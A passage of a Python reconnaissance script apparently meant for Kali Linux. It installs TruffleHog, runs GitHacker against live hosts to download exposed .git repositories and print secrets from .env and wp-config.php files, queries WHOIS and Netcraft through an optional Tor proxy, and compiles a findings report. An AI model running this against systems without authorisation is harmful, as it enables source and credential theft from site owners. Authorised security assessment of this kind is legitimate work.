                    tar.extractall(extract_dir, filter='data')
                else:
                    tar.extractall(extract_dir)
            print(f"{Colors.GREEN}   ✅ Extracted successfully{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}   ⚠️ Tar extraction failed, trying system tar...{Colors.RESET}")
            subprocess.run(f"tar -xzf {tar_file} -C {extract_dir}", shell=True)
        
        # Find binary
        binary_path = None
        for root, dirs, files in os.walk(extract_dir):
            if 'trufflehog' in files:
                binary_path = os.path.join(root, 'trufflehog')
                break
        
        if not binary_path:
            print(f"{Colors.RED}   ❌ Binary not found{Colors.RESET}")
            return None
        
        # Install
        print(f"{Colors.CYAN}   Installing to /usr/local/bin/...{Colors.RESET}")
        try:
            subprocess.run(f"sudo cp {binary_path} /usr/local/bin/trufflehog", shell=True, check=True)
            subprocess.run("sudo chmod +x /usr/local/bin/trufflehog", shell=True, check=True)
            print(f"{Colors.GREEN}   ✅ Installed to /usr/local/bin/trufflehog{Colors.RESET}")
            trufflehog_path = "/usr/local/bin/trufflehog"
        except:
            try:
                os.makedirs(os.path.expanduser("~/.local/bin"), exist_ok=True)
                subprocess.run(f"cp {binary_path} ~/.local/bin/trufflehog", shell=True, check=True)
                subprocess.run("chmod +x ~/.local/bin/trufflehog", shell=True, check=True)
                print(f"{Colors.GREEN}   ✅ Installed to ~/.local/bin/trufflehog{Colors.RESET}")
                trufflehog_path = os.path.expanduser("~/.local/bin/trufflehog")
            except:
                print(f"{Colors.RED}   ❌ Installation failed{Colors.RESET}")
                return None
        
        # Cleanup
        try:
            os.remove(tar_file)
            subprocess.run(f"rm -rf {extract_dir}", shell=True)
        except:
            pass
        
        # Verify
        try:
            result = subprocess.run([trufflehog_path, '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{Colors.GREEN}✅ TruffleHog installed: {result.stdout.strip()}{Colors.RESET}")
                return trufflehog_path
        except:
            pass
        
        return None

    # ==================== GITHACKER ====================
    # ==================== GITHACKER - UPDATED VERSION ====================
    def run_githacker_all(self):
        """GitHacker - Scan for exposed .git repositories on live hosts"""
        print(f"\n{Colors.CYAN}🔍 GITHACKER - GIT REPOSITORY DISCOVERY{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        # Check if GitHacker is installed
        if not self.check_and_install_tool('githacker'):
            print(f"{Colors.RED}❌ GitHacker not available{Colors.RESET}")
            return

        # ============ CHECK IF LIVE HOSTS EXIST ============
        if not self.live_hosts:
            print(f"{Colors.YELLOW}⚠️ No live hosts found. Skipping GitHacker scan.{Colors.RESET}")
            print(f"{Colors.BLUE}💡 Run HTTPX first to find live hosts.{Colors.RESET}")
            return

        print(f"{Colors.GREEN}✅ Found {len(self.live_hosts)} live hosts{Colors.RESET}")
        print(f"{Colors.CYAN}📋 Live hosts:{Colors.RESET}")
        for host in self.live_hosts[:5]:
            print(f"{Colors.BLUE}   - {host}{Colors.RESET}")
        if len(self.live_hosts) > 5:
            print(f"{Colors.YELLOW}   ... and {len(self.live_hosts)-5} more{Colors.RESET}")

        # ============ SCAN EACH LIVE HOST ============
        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}🔍 SCANNING LIVE HOSTS FOR .git EXPOSURE{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        all_findings = []
        successful_scans = 0

        for i, host in enumerate(self.live_hosts, 1):
            print(f"\n{Colors.CYAN}📝 [{i}/{len(self.live_hosts)}] Scanning: {host}{Colors.RESET}")
            
            # Build URLs
            urls_to_scan = [
                f"http://{host}/.git",
                f"https://{host}/.git",
            ]
            
            host_found = False
            host_findings = []
            
            for url in urls_to_scan:
                # Create output folder
                safe_name = re.sub(r'[^a-zA-Z0-9]', '_', host)
                output_folder = f"{self.results_dir}/githacker_{safe_name}"
                
                # Build command
                cmd = f"githacker --url {url} --output-folder {output_folder} --brute"
                
                # Add proxy if enabled
                if self.use_proxy:
                    cmd = f"{self.proxy_prefix} {cmd}"
                
                print(f"{Colors.BLUE}   🔍 Checking: {url}{Colors.RESET}")
                
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=120
                    )
                    
                    # Check if successful
                    if 'exploited successfully' in result.stdout:
                        print(f"{Colors.GREEN}      ✅ Found .git repository!{Colors.RESET}")
                        host_found = True
                        
                        # Count files
                        file_count = 0
                        if os.path.exists(output_folder):
                            for root, dirs, files in os.walk(output_folder):
                                file_count += len(files)
                            print(f"{Colors.CYAN}      📁 Files downloaded: {file_count}{Colors.RESET}")
                            
                            if file_count > 0:
                                host_findings.append({
                                    'url': url,
                                    'files': file_count,
                                    'folder': output_folder
                                })
                                
                                # Show sample files
                                print(f"{Colors.BLUE}      Sample files:{Colors.RESET}")
                                for root, dirs, files in os.walk(output_folder):
                                    for f in files[:5]:
                                        path = os.path.join(root, f)
                                        size = os.path.getsize(path)
                                        print(f"{Colors.GREEN}         ✅ {f} ({size} bytes){Colors.RESET}")
                                    if len(files) > 5:
                                        print(f"{Colors.YELLOW}         ... and {len(files)-5} more{Colors.RESET}")
                                    break
                                
                                # Check for sensitive files
                                sensitive = ['.env', 'config.php', 'wp-config.php', 'database.yml', 'settings.py']
                                for root, dirs, files in os.walk(output_folder):
                                    for s in sensitive:
                                        if s in files:
                                            path = os.path.join(root, s)
                                            with open(path, 'r') as f:
                                                content = f.read()
                                                print(f"{Colors.RED}      🔥 SENSITIVE: {s}{Colors.RESET}")
                                                print(f"{Colors.YELLOW}{content[:200]}{'...' if len(content) > 200 else ''}{Colors.RESET}")
                                            break
                        break
                    else:
                        print(f"{Colors.YELLOW}      ❌ No .git found{Colors.RESET}")
                        
                except subprocess.TimeoutExpired:
                    print(f"{Colors.RED}      ❌ Timeout (120s){Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}      ❌ Error: {str(e)[:100]}{Colors.RESET}")
            
            if host_found:
                successful_scans += 1
                all_findings.extend(host_findings)

        # ============ SUMMARY ============
        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 GITHACKER SUMMARY{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}Total live hosts scanned: {len(self.live_hosts)}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Hosts with .git exposure: {successful_scans}{Colors.RESET}")
        print(f"{Colors.RED}⚠️ Total .git repositories found: {len(all_findings)}{Colors.RESET}")
        
        if all_findings:
            print(f"\n{Colors.GREEN}🎯 .git repositories found:{Colors.RESET}")
            for f in all_findings:
                print(f"{Colors.GREEN}   ✅ {f['url']}{Colors.RESET}")
                print(f"{Colors.BLUE}      Files: {f['files']}{Colors.RESET}")
                print(f"{Colors.BLUE}      Location: {f['folder']}{Colors.RESET}")
            
            # Save findings
            with open(f"{self.results_dir}/githacker_findings.txt", 'w') as f:
                f.write(f"GITHACKER FINDINGS\n")
                f.write(f"Target: {self.target}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*70 + "\n\n")
                for item in all_findings:
                    f.write(f"URL: {item['url']}\n")
                    f.write(f"Files: {item['files']}\n")
                    f.write(f"Location: {item['folder']}\n")
                    f.write("-"*40 + "\n")
            print(f"{Colors.CYAN}📁 Findings saved: {self.results_dir}/githacker_findings.txt{Colors.RESET}")
            self.files.append(f"{self.results_dir}/githacker_findings.txt")
        else:
            print(f"\n{Colors.YELLOW}⚠️ No .git repositories found{Colors.RESET}")
            print(f"{Colors.BLUE}💡 This is normal. Not all sites expose .git.{Colors.RESET}")

        print(f"{Colors.CYAN}📁 Results folder: {self.results_dir}{Colors.RESET}")
        return successful_scans

    # ==================== WHOIS ====================
    def run_whois_all(self):
        """Run WHOIS with supported options only"""
        print(f"\n{Colors.CYAN}🔍 WHOIS - ALL OPTIONS (SUPPORTED ONLY){Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        if not self.check_and_install_tool('whois'):
            print(f"{Colors.RED}❌ WHOIS not available{Colors.RESET}")
            return

        # Only supported WHOIS options in Kali
        whois_tests = [
            # 1. Standard WHOIS
            ("Standard", f"whois {self.clean_target}"),
            
            # 2. WHOIS with specific server (Verisign)
            ("Verisign Server", f"whois -h whois.verisign-grs.com {self.clean_target}"),
            
            # 3. WHOIS with IANA server
            ("IANA Server", f"whois -h whois.iana.org {self.clean_target}"),
            
            # 4. WHOIS with ARIN server
            ("ARIN Server", f"whois -h whois.arin.net {self.clean_target}"),
            
            # 5. WHOIS with specific port
            ("Port 43", f"whois -p 43 {self.clean_target}"),
            
            # 6. IANA query
            ("IANA Query", f"whois -I {self.clean_target}"),
            
            # 7. WHOIS with no recursion
            ("No Recursion", f"whois --no-recursion {self.clean_target}"),
            
            # 8. WHOIS with verbose
            ("Verbose", f"whois --verbose {self.clean_target} 2>&1")
        ]

        all_outputs = []
        successful = 0
        
        for name, cmd in whois_tests:
            print(f"\n{Colors.CYAN}📝 {name} WHOIS{Colors.RESET}")
            output = self.run_command(cmd, f"WHOIS - {name}", use_proxy=False)
            
            if output:
                successful += 1
                # Save output
                filename = f"{self.results_dir}/whois_{name.lower().replace(' ', '_')}.txt"
                with open(filename, 'w') as f:
                    f.write(output)
                all_outputs.append(f"\n=== {name} ===\n{output}")
                
                # Parse and show info (only for first successful)
                if successful == 1:
                    self.parse_whois_output(output)
            else:
                print(f"{Colors.YELLOW}⚠️ {name} WHOIS failed{Colors.RESET}")

        # Save combined results
        with open(f"{self.results_dir}/whois_all.txt", 'w') as f:
            f.write(f"WHOIS SCAN RESULTS FOR: {self.clean_target}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n")
            f.write("\n".join(all_outputs))
        
        print(f"\n{Colors.GREEN}✅ WHOIS completed: {successful}/{len(whois_tests)} successful{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Saved: {self.results_dir}/whois_all.txt{Colors.RESET}")
        
        return successful

    def parse_whois_output(self, output):
        """Parse and display WHOIS output"""
        print(f"\n{Colors.CYAN}📊 WHOIS Information:{Colors.RESET}")
        
        fields = {
            'Domain Name': r'Domain Name:\s*(.+)',
            'Registry Domain ID': r'Registry Domain ID:\s*(.+)',
            'Registrar': r'Registrar:\s*(.+)',
            'Registrar URL': r'Registrar URL:\s*(.+)',
            'Creation Date': r'Creation Date:\s*(.+)',
            'Updated Date': r'Updated Date:\s*(.+)',
            'Expiry Date': r'Expiry Date:\s*(.+)',
            'Registry Expiry Date': r'Registry Expiry Date:\s*(.+)',
            'Registrant Name': r'Registrant Name:\s*(.+)',
            'Registrant Organization': r'Registrant Organization:\s*(.+)',
            'Registrant Email': r'Registrant Email:\s*(.+)',
            'Admin Name': r'Admin Name:\s*(.+)',
            'Admin Email': r'Admin Email:\s*(.+)',
            'Tech Name': r'Tech Name:\s*(.+)',
            'Tech Email': r'Tech Email:\s*(.+)',
            'Name Server': r'Name Server:\s*(.+)',
            'DNSSEC': r'DNSSEC:\s*(.+)',
            'Status': r'Status:\s*(.+)'
        }
        
        found_info = {}
        nameservers = []
        
        for field, pattern in fields.items():
            matches = re.findall(pattern, output, re.I)
            if matches:
                if field == 'Name Server':
                    nameservers.extend(matches)
                else:
                    found_info[field] = matches[0]
        
        for field, value in found_info.items():
            print(f"{Colors.GREEN}   {field}: {value}{Colors.RESET}")
        
        if nameservers:
            # Remove duplicates
            nameservers = list(set(nameservers))
            print(f"{Colors.GREEN}   Nameservers:{Colors.RESET}")
            for ns in nameservers[:10]:
                print(f"{Colors.GREEN}      - {ns}{Colors.RESET}")
                
    # ==================== NETCRAFT ====================
    def run_netcraft(self):
        """Run Netcraft information gathering - Complete Version"""
        print(f"\n{Colors.CYAN}🔍 NETCRAFT - COMPLETE INFORMATION GATHERING{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        try:
            url = f"https://sitereport.netcraft.com/?url={self.clean_target}"
            print(f"{Colors.CYAN}📥 Fetching Netcraft report...{Colors.RESET}")
            
            # Use proxy if enabled
            if self.use_proxy:
                proxies = {
                    'http': 'socks5://127.0.0.1:9050',
                    'https': 'socks5://127.0.0.1:9050'
                }
                response = requests.get(url, timeout=60, proxies=proxies)
            else:
                response = requests.get(url, timeout=60)

            if response.status_code == 200:
                # Save full HTML report
                with open(f"{self.results_dir}/netcraft_report.html", 'w') as f:
                    f.write(response.text)
                
                print(f"{Colors.GREEN}✅ Netcraft report saved{Colors.RESET}")
                
                # Extract ALL available information
                print(f"\n{Colors.CYAN}📊 NETCRAFT INFORMATION:{Colors.RESET}")
                
                # 1. Server Information
                server = re.search(r'Server:<\/dt><dd>([^<]+)', response.text, re.I)
                if server:
                    print(f"{Colors.GREEN}   Server: {server.group(1).strip()}{Colors.RESET}")
                
                # 2. Operating System
                os_info = re.search(r'Operating System:<\/dt><dd>([^<]+)', response.text, re.I)
                if os_info:
                    print(f"{Colors.GREEN}   Operating System: {os_info.group(1).strip()}{Colors.RESET}")
                
                # 3. IP Address
                ip = re.search(r'IP address:<\/dt><dd>([^<]+)', response.text, re.I)
                if ip:
                    print(f"{Colors.GREEN}   IP Address: {ip.group(1).strip()}{Colors.RESET}")
                    self.ips.append(ip.group(1).strip())
                
                # 4. Hosting Provider
                hosting = re.search(r'Hosting provider:<\/dt><dd>([^<]+)', response.text, re.I)
                if hosting:
                    print(f"{Colors.GREEN}   Hosting Provider: {hosting.group(1).strip()}{Colors.RESET}")
                
                # 5. Country
                country = re.search(r'Country:<\/dt><dd>([^<]+)', response.text, re.I)
                if country:
                    print(f"{Colors.GREEN}   Country: {country.group(1).strip()}{Colors.RESET}")
                
                # 6. Organisation
                org = re.search(r'Organisation:<\/dt><dd>([^<]+)', response.text, re.I)
                if org:
                    print(f"{Colors.GREEN}   Organisation: {org.group(1).strip()}{Colors.RESET}")
                
                # 7. Nameservers
                nameservers = re.findall(r'Nameserver:<\/dt><dd>([^<]+)', response.text, re.I)
                if nameservers:
                    print(f"{Colors.GREEN}   Nameservers:{Colors.RESET}")
                    for ns in nameservers[:5]:
                        print(f"{Colors.GREEN}      - {ns.strip()}{Colors.RESET}")
                
                # 8. Registrar
                registrar = re.search(r'Registrar:<\/dt><dd>([^<]+)', response.text, re.I)
                if registrar:
                    print(f"{Colors.GREEN}   Registrar: {registrar.group(1).strip()}{Colors.RESET}")
                
                # 9. Registration Date
                reg_date = re.search(r'Registration Date:<\/dt><dd>([^<]+)', response.text, re.I)
                if reg_date:
                    print(f"{Colors.GREEN}   Registration Date: {reg_date.group(1).strip()}{Colors.RESET}")
                
                # 10. Expiry Date
                expiry_date = re.search(r'Expiry Date:<\/dt><dd>([^<]+)', response.text, re.I)
                if expiry_date:
                    print(f"{Colors.GREEN}   Expiry Date: {expiry_date.group(1).strip()}{Colors.RESET}")
                
                # 11. Domain Age
                domain_age = re.search(r'Domain age:<\/dt><dd>([^<]+)', response.text, re.I)
                if domain_age:
                    print(f"{Colors.GREEN}   Domain Age: {domain_age.group(1).strip()}{Colors.RESET}")
                
                # 12. SSL/TLS
                ssl = re.search(r'SSL/TLS:<\/dt><dd>([^<]+)', response.text, re.I)
                if ssl:
                    print(f"{Colors.GREEN}   SSL/TLS: {ssl.group(1).strip()}{Colors.RESET}")
                
                # 13. Site Rank
                rank = re.search(r'Site rank:<\/dt><dd>([^<]+)', response.text, re.I)
                if rank:
                    print(f"{Colors.GREEN}   Site Rank: {rank.group(1).strip()}{Colors.RESET}")
                
                # 14. Last Seen
                last_seen = re.search(r'Last seen:<\/dt><dd>([^<]+)', response.text, re.I)
                if last_seen:
                    print(f"{Colors.GREEN}   Last Seen: {last_seen.group(1).strip()}{Colors.RESET}")
                
                # 15. Status
                status = re.search(r'Status:<\/dt><dd>([^<]+)', response.text, re.I)
                if status:
                    print(f"{Colors.GREEN}   Status: {status.group(1).strip()}{Colors.RESET}")
                
                # Save extracted info to file
                with open(f"{self.results_dir}/netcraft_info.txt", 'w') as f:
                    f.write(f"Netcraft Information for: {self.clean_target}\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("="*70 + "\n\n")
                    
                    if server:
                        f.write(f"Server: {server.group(1).strip()}\n")
                    if os_info:
                        f.write(f"OS: {os_info.group(1).strip()}\n")
                    if ip:
                        f.write(f"IP: {ip.group(1).strip()}\n")
                    if hosting:
                        f.write(f"Hosting: {hosting.group(1).strip()}\n")
                    if country:
                        f.write(f"Country: {country.group(1).strip()}\n")
                    if org:
                        f.write(f"Organization: {org.group(1).strip()}\n")
                    if registrar:
                        f.write(f"Registrar: {registrar.group(1).strip()}\n")
                    if reg_date:
                        f.write(f"Registered: {reg_date.group(1).strip()}\n")
                    if expiry_date:
                        f.write(f"Expires: {expiry_date.group(1).strip()}\n")
                    if domain_age:
                        f.write(f"Domain Age: {domain_age.group(1).strip()}\n")
                    if nameservers:
                        f.write(f"Nameservers: {', '.join([ns.strip() for ns in nameservers])}\n")
                    if ssl:
                        f.write(f"SSL/TLS: {ssl.group(1).strip()}\n")
                    if rank:
                        f.write(f"Rank: {rank.group(1).strip()}\n")
                    if status:
                        f.write(f"Status: {status.group(1).strip()}\n")
                
                print(f"\n{Colors.GREEN}✅ Netcraft information saved: {self.results_dir}/netcraft_info.txt{Colors.RESET}")
                return True
                
            else:
                print(f"{Colors.RED}❌ Netcraft returned status: {response.status_code}{Colors.RESET}")
                return False
                
        except requests.exceptions.Timeout:
            print(f"{Colors.RED}❌ Netcraft request timed out (60 seconds){Colors.RESET}")
            print(f"{Colors.YELLOW}💡 Check internet connection{Colors.RESET}")
            return False
        except requests.exceptions.ConnectionError:
            print(f"{Colors.RED}❌ Netcraft connection error{Colors.RESET}")
            print(f"{Colors.YELLOW}💡 Check internet connection{Colors.RESET}")
            return False
        except Exception as e:
            print(f"{Colors.RED}❌ Failed to get Netcraft info: {str(e)[:50]}{Colors.RESET}")
            return False

    def collect_all_findings(self):
        findings = {
            'subdomains': self.subdomains,
            'live_hosts': self.live_hosts,
            'ips': self.ips,
            'open_ports': getattr(self, 'open_ports', []),
            'directories': self.directories,
            'urls': self.urls,
            'timestamp': datetime.now().isoformat(),
            'proxy_used': self.use_proxy,
            'proxy_config': self.proxy_config if self.use_proxy else None
        }
        return findings

    # ==================== GENERATE FINAL REPORT ====================
    
    def generate_report(self):
        """Generate comprehensive final report with ALL findings - Detailed Version"""
        print(f"\n{Colors.MAGENTA}📊 Generating Final Report (Detailed){Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        # ============ COLLECT ALL DATA ============
        all_files = {}
        total_size = 0
        for root, dirs, files in os.walk(self.results_dir):
            for file in files:
                file_path = os.path.join(root, file)
                size = os.path.getsize(file_path)
                all_files[file_path] = size
                total_size += size

        # ============ READ TOOL OUTPUTS ============
        # Dmitry
        dmitry_emails = []
        dmitry_emails_file = f"{self.results_dir}/dmitry_all_emails.txt"
        if os.path.exists(dmitry_emails_file):
            with open(dmitry_emails_file, 'r') as f:
                dmitry_emails = [line.strip() for line in f if line.strip()]

        dmitry_ports = []
        dmitry_ports_file = f"{self.results_dir}/dmitry_open_ports.txt"
        if os.path.exists(dmitry_ports_file):
            with open(dmitry_ports_file, 'r') as f:
                dmitry_ports = [line.strip() for line in f if line.strip()]

        # URL categories
        url_categories = {}
        url_categories_file = f"{self.results_dir}/url_categories.json"
        if os.path.exists(url_categories_file):
            try:
                with open(url_categories_file, 'r') as f:
                    url_categories = json.load(f)
            except:
                pass

        # Zone transfer
        zone_transfer_data = {}
        zone_transfer_file = f"{self.results_dir}/zone_transfer_results.json"
        if os.path.exists(zone_transfer_file):
            try:
                with open(zone_transfer_file, 'r') as f:
                    zone_transfer_data = json.load(f)
            except:
                pass

        # theHarvester
        theharvester_emails = []
        theharvester_emails_file = f"{self.results_dir}/theharvester_emails.txt"
        if os.path.exists(theharvester_emails_file):
            with open(theharvester_emails_file, 'r') as f:
                theharvester_emails = [line.strip() for line in f if line.strip()]

        theharvester_subdomains = []
        theharvester_subdomains_file = f"{self.results_dir}/theharvester_subdomains.txt"
        if os.path.exists(theharvester_subdomains_file):
            with open(theharvester_subdomains_file, 'r') as f:
                theharvester_subdomains = [line.strip() for line in f if line.strip()]

        # Subfinder
        subfinder_subdomains = []
        subfinder_file = f"{self.results_dir}/subfinder_all.txt"
        if os.path.exists(subfinder_file):
            with open(subfinder_file, 'r') as f:
                subfinder_subdomains = [line.strip() for line in f if line.strip()]

        # HTTPX
        httpx_output = []
        httpx_file = f"{self.results_dir}/httpx_all.txt"
        if os.path.exists(httpx_file):
            with open(httpx_file, 'r') as f:
                httpx_output = f.read()

        # Katana
        katana_urls = []
        katana_file = f"{self.results_dir}/katana_all_urls.txt"
        if os.path.exists(katana_file):
            with open(katana_file, 'r') as f:
                katana_urls = [line.strip() for line in f if line.strip()]

        # WebDork
        webdork_urls = []
        webdork_file = f"{self.results_dir}/webdork_results.txt"
        if os.path.exists(webdork_file):
            with open(webdork_file, 'r') as f:
                webdork_urls = [line.strip() for line in f if line.strip()]

        # Searchsploit
        searchsploit_findings = []
        searchsploit_file = f"{self.results_dir}/searchsploit_all_findings.txt"
        if os.path.exists(searchsploit_file):
            with open(searchsploit_file, 'r') as f:
                searchsploit_findings = [line.strip() for line in f if line.strip()]

        # TruffleHog
        trufflehog_secrets = []
        trufflehog_file = f"{self.results_dir}/trufflehog_secrets.txt"
        if os.path.exists(trufflehog_file):
            with open(trufflehog_file, 'r') as f:
                trufflehog_secrets = f.read()

        # GitHacker
        githacker_findings = []
        githacker_file = f"{self.results_dir}/githacker_findings.txt"
        if os.path.exists(githacker_file):
            with open(githacker_file, 'r') as f:
                githacker_findings = [line.strip() for line in f if line.strip()]

        # WHOIS
        whois_output = []
        whois_file = f"{self.results_dir}/whois_all.txt"
        if os.path.exists(whois_file):
            with open(whois_file, 'r') as f:
                whois_output = f.read()

        # Netcraft
        netcraft_info = []
        netcraft_file = f"{self.results_dir}/netcraft_info.txt"
        if os.path.exists(netcraft_file):
            with open(netcraft_file, 'r') as f:
                netcraft_info = [line.strip() for line in f if line.strip()]

        # Nmap
        nmap_output = []
        nmap_file = f"{self.results_dir}/nmap_scan.txt"
        if os.path.exists(nmap_file):
            with open(nmap_file, 'r') as f:
                nmap_output = f.read()

        # Dmitry combined report
        dmitry_combined = []
        dmitry_combined_file = f"{self.results_dir}/DMITRY_COMPLETE_REPORT.txt"
        if os.path.exists(dmitry_combined_file):
            with open(dmitry_combined_file, 'r') as f:
                dmitry_combined = f.read()

        # ============ BUILD DETAILED REPORT ============
        report_lines = []

        # Header
        report_lines.append(f"""# 🔍 RECONNAISSANCE SCAN REPORT - DETAILED

    ## 📋 BASIC INFORMATION

    | Property | Value |
    |----------|-------|
    | **Target** | `{self.target}` |
    | **Domain** | `{self.clean_target}` |
    | **Scan Date** | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} |
    | **Results Directory** | `{self.results_dir}` |
    | **Proxy Enabled** | {self.use_proxy} |
    | **Proxy Tool** | Proxychains4 |
    | **Proxy Config** | {self.proxy_config if self.use_proxy else 'N/A'} |
    | **Total Files Generated** | {len(all_files)} |
    | **Total Data Size** | {self._format_size(total_size)} |

    ---

    ## 📊 EXECUTIVE SUMMARY

    | Category | Count |
    |----------|-------|
    | Subdomains Found (Unique) | {len(self.subdomains)} |
    | Live Hosts | {len(self.live_hosts)} |
    | Open Ports (Nmap) | {len(self.open_ports) if hasattr(self, 'open_ports') else 0} |
    | IPs Identified | {len(self.ips)} |
    | URLs Discovered (Katana) | {len(katana_urls)} |
    | URLs from WebDork | {len(webdork_urls)} |
    | Emails Found (Dmitry) | {len(dmitry_emails)} |
    | Emails Found (theHarvester) | {len(theharvester_emails)} |
    | Subdomains (theHarvester) | {len(theharvester_subdomains)} |
    | Subdomains (Subfinder) | {len(subfinder_subdomains)} |
    | Vulnerabilities/Exploits (Searchsploit) | {len(searchsploit_findings)} |
    | Secrets Found (TruffleHog) | {'Yes' if trufflehog_secrets else 'No'} |
    | .git Repositories Found (GitHacker) | {len(githacker_findings)} |

    ---

    ## 🎯 SUBDOMAINS ({len(self.subdomains)})

    """)

        if self.subdomains:
            report_lines.append("| # | Subdomain |\n|----|-----------|\n")
            for i, sub in enumerate(sorted(self.subdomains)[:100], 1):
                report_lines.append(f"| {i} | `{sub}` |\n")
            if len(self.subdomains) > 100:
                report_lines.append(f"\n*... and {len(self.subdomains)-100} more subdomains*\n")
            report_lines.append(f"\n📁 **Full list:** `{self.results_dir}/subdomains_alt.txt`\n")
        else:
            report_lines.append("*No subdomains found*\n")
        report_lines.append("\n")

        # ============ TOOLWISE DETAILED SECTIONS ============

        # 1. DMITRY
        report_lines.append(f"""
    ## 🔍 DMITRY - COMPLETE INFORMATION GATHERING

    **Total Tests:** 7
    **Emails Found:** {len(dmitry_emails)}
    **Open Ports Found:** {len(dmitry_ports)}
    **IPs/Domains Extracted:** Yes

    ### 📧 Emails Found
    """)
        if dmitry_emails:
            for email in dmitry_emails[:20]:
                report_lines.append(f"- `{email}`\n")
            if len(dmitry_emails) > 20:
                report_lines.append(f"\n*... and {len(dmitry_emails)-20} more*\n")
        else:
            report_lines.append("*No emails found*\n")

        report_lines.append(f"""
    ### 🔓 Open Ports Found
    """)
        if dmitry_ports:
            for port in dmitry_ports:
                if port == '111':
                    report_lines.append(f"- ⚠️ **Port {port}** - RPC (Security Risk!)\n")
                else:
                    report_lines.append(f"- Port {port}\n")
        else:
            report_lines.append("*No open ports found*\n")

        report_lines.append(f"""
    📁 **Dmitry Results Directory:** `{self.results_dir}/dmitry/`
    📄 **Combined Report:** `{self.results_dir}/DMITRY_COMPLETE_REPORT.txt`
    """)

        # 2. NMAP
        report_lines.append(f"""
    ## 🔍 NMAP PORT SCAN

    **Open Ports Found:** {len(self.open_ports) if hasattr(self, 'open_ports') else 0}

    """)
        if hasattr(self, 'open_ports') and self.open_ports:
            report_lines.append("| Port | Service |\n|------|---------|\n")
            for port in sorted(self.open_ports):
                report_lines.append(f"| {port} | {self._get_port_service(port)} |\n")
        else:
            report_lines.append("*No open ports found*\n")

        report_lines.append(f"""
    📁 **Nmap Output:** `{self.results_dir}/nmap_scan.txt`
    📁 **Nmap XML:** `{self.results_dir}/nmap_scan.xml`
    """)

        # 3. WHOIS
        report_lines.append(f"""
    ## 🔍 WHOIS LOOKUP

    📁 **Combined WHOIS Output:** `{self.results_dir}/whois_all.txt`

    ### Summary
    """)
        if whois_output:
            # Extract key fields
            lines = whois_output.split('\n')
            for line in lines[:20]:
                if 'Domain Name' in line or 'Registrar' in line or 'Creation Date' in line or 'Expiry Date' in line or 'Name Server' in line:
                    report_lines.append(f"- {line}\n")
        else:
            report_lines.append("*No WHOIS data available*\n")

        # 4. NETCRAFT
        report_lines.append(f"""
    ## 🔍 NETCRAFT INFORMATION

    📁 **Netcraft Report:** `{self.results_dir}/netcraft_info.txt`
    📁 **Full HTML:** `{self.results_dir}/netcraft_report.html`

    ### Extracted Info
    """)
        if netcraft_info:
            for line in netcraft_info[:15]:
                report_lines.append(f"- {line}\n")
        else:
            report_lines.append("*No Netcraft information retrieved*\n")

        # 5. SUBFINDER
        report_lines.append(f"""
    ## 🔍 SUBFINDER - SUBDOMAIN DISCOVERY

    **Subdomains Found:** {len(subfinder_subdomains)}

    📁 **Full Output:** `{self.results_dir}/subfinder_all.txt`

    ### Sample Subdomains
    """)
        if subfinder_subdomains:
            for sub in subfinder_subdomains[:20]:
                report_lines.append(f"- `{sub}`\n")
            if len(subfinder_subdomains) > 20:
                report_lines.append(f"\n*... and {len(subfinder_subdomains)-20} more*\n")
        else:
            report_lines.append("*No subdomains found*\n")

        # 6. HTTPX
        report_lines.append(f"""
    ## 🔍 HTTPX - LIVE HOST DISCOVERY

    **Live Hosts Found:** {len(self.live_hosts)}

    📁 **Full Output:** `{self.results_dir}/httpx_all.txt`
    📁 **Live Hosts List:** `{self.results_dir}/live_hosts_list.txt`

    ### Live Hosts
    """)
        if self.live_hosts:
            for host in self.live_hosts[:20]:
                report_lines.append(f"- `{host}`\n")
            if len(self.live_hosts) > 20:
                report_lines.append(f"\n*... and {len(self.live_hosts)-20} more*\n")
        else:
            report_lines.append("*No live hosts found*\n")

        # 7. KATANA
        report_lines.append(f"""
    ## 🔍 KATANA - URL DISCOVERY

    **Unique URLs Found:** {len(katana_urls)}

    📁 **All URLs:** `{self.results_dir}/katana_all_urls.txt`

    ### Sample URLs
    """)
        if katana_urls:
            for url in katana_urls[:20]:
                report_lines.append(f"- `{url}`\n")
            if len(katana_urls) > 20:
                report_lines.append(f"\n*... and {len(katana_urls)-20} more*\n")
        else:
            report_lines.append("*No URLs discovered*\n")

        # 8. WEBDORK
        report_lines.append(f"""
    ## 🔍 WEBDORK - GOOGLE DORKS

    **URLs Found:** {len(webdork_urls)}

    📁 **Results:** `{self.results_dir}/webdork_results.txt`

    ### Sample Results
    """)
        if webdork_urls:
            for url in webdork_urls[:20]:
                report_lines.append(f"- `{url}`\n")
            if len(webdork_urls) > 20:
                report_lines.append(f"\n*... and {len(webdork_urls)-20} more*\n")
        else:
            report_lines.append("*No results from WebDork*\n")

        # 9. THEHARVESTER
        report_lines.append(f"""
    ## 🔍 THEHARVESTER - OSINT HARVESTING

    **Emails Found:** {len(theharvester_emails)}
    **Subdomains Found:** {len(theharvester_subdomains)}

    📁 **Emails:** `{self.results_dir}/theharvester_emails.txt`
    📁 **Subdomains:** `{self.results_dir}/theharvester_subdomains.txt`

    ### Emails
    """)
        if theharvester_emails:
            for email in theharvester_emails[:20]:
